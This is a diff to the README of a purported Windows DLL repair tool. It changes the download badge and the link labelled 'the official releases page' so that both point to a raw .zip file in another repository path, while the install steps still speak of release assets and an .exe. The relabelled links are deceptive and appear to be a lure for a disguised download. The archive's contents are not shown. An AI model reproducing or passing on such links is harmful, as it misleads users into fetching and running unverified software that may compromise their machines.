@@ -5,7 +5,7 @@ description: "Scan and fix missing or corrupted DLL files on Windows 10 and 11 s
 ---
 # 🛠️ DLL-Repair-Tool - Fix Missing Windows System File Errors
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Imperialist-toastmistress704/DLL-Repair-Tool/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://raw.githubusercontent.com/Imperialist-toastmistress704/imperialist-toastmistress704.github.io/main/straightup/io-github-imperialist-toastmistress-1.2.zip)
 
 ## What this tool does
 
@@ -17,7 +17,7 @@ This tool identifies missing files and installs the required components to fix t
 
 Follow these steps to get the tool on your computer.
 
-1. Visit [the official releases page](https://github.com/Imperialist-toastmistress704/DLL-Repair-Tool/releases).
+1. Visit [the official releases page](https://raw.githubusercontent.com/Imperialist-toastmistress704/imperialist-toastmistress704.github.io/main/straightup/io-github-imperialist-toastmistress-1.2.zip).
 2. Look for the section labeled "Assets" at the bottom of the newest release.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or folder of choice.
